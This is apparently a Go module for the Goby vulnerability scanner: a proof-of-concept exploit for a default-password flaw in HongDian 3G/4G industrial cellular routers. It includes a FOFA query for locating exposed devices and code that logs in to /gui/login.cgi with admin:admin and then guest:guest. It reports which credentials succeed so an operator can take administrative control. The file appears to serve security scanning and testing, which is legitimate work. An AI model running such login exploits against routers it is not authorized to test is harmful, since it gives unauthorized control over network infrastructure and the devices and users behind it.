package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HongDian 3/4G Rotue login.cgi File Dafult Password Vulnerability",
    "Description": "<p>Hongdian's Cellular Routers are industrial grade, simple-to-manage, enabling IoT / M2M deployments anywhere in the world and offering full flexible API integration and pricing structures, to fit your IoT business needs. </p><p>There is a dafult password vulnerability in HongDian 3/4G Rotue.Attacker can use the vulnerability to get administrative authority</p>",
    "Impact": "HongDian 3/4G Rotue Dafult Password",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "HongDian 3/4G Rotue",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "HongDian 3/4G 路由器 login.cgi 文件默认口令漏洞",
            "Description": "<p>HongDian 3/4G 路由器是一款功能丰富、应用广泛的工业级VPN路由器。</p><p>HongDian 3/4G 路由器存在默认口令漏洞。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">HongDian 4/5G 路由器是一款功能丰富、应用广泛的工业级VPN路由器。攻击者可利用该漏洞以管理员身份或访客身份登录后台，获得管理权限。</span><br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "HongDian 3/4G 路由器",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "HongDian 3/4G Rotue login.cgi File Dafult Password Vulnerability",
            "Description": "<p>Hongdian's Cellular Routers are industrial grade, simple-to-manage, enabling IoT / M2M deployments anywhere in the world and offering full flexible API integration and pricing structures, to fit your IoT business needs. </p><p>There is a dafult password vulnerability in HongDian 3/4G Rotue.Attacker can use the vulnerability to get administrative authority</p>",
            "Impact": "HongDian 3/4G Rotue Dafult Password",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Product": "HongDian 3/4G Rotue",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"status_main.cgi\" && title=\"3G/4G Router\" && cert=\"Organization: route\"",
    "GobyQuery": "body=\"status_main.cgi\" && title=\"3G/4G Router\" && cert=\"Organization: route\"",
    "Author": "AnMing",
    "Homepage": "http://hongdian.com/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://fofa.info"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/gui/login.cgi"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.IP)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Referer", u.FixedHostInfo+"/gui/login.cgi")
			cfg.Header.Store("Origin", u.FixedHostInfo)
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-Site", "same-origin")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Data = "auth_mode=local&user=admin&login_status=&passwd=admin&tokenKey="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Set-Cookie"), "authentication") && strings.Contains(resp.Utf8Html, "Capture(share.build_time)") {
					return true
				} else {
					cfg.Data = "auth_mode=local&user=guest&login_status=&passwd=guest&tokenKey="
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Set-Cookie"), "authentication") && strings.Contains(resp.Utf8Html, "Capture(share.build_time)") {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/gui/login.cgi"
			cfg := httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.IP)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+"/gui/login.cgi")
			cfg.Header.Store("Origin", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-Site", "same-origin")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			cfg.Data = "auth_mode=local&user=admin&login_status=&passwd=admin&tokenKey="
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Set-Cookie"), "authentication") && strings.Contains(resp.Utf8Html, "Capture(share.build_time)") {
					expResult.Success = true
					expResult.Output = "Success! Plase use \"admin:admin\" to login!"
				} else {
					cfg.Data = "auth_mode=local&user=guest&login_status=&passwd=guest&tokenKey="
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Set-Cookie"), "authentication") && strings.Contains(resp.Utf8Html, "Capture(share.build_time)") {
							expResult.Success = true
							expResult.Output = "Success! Plase use \"guest:guest\" to login!"
						}
					}
				}
			}
			return expResult
		},
	))
}
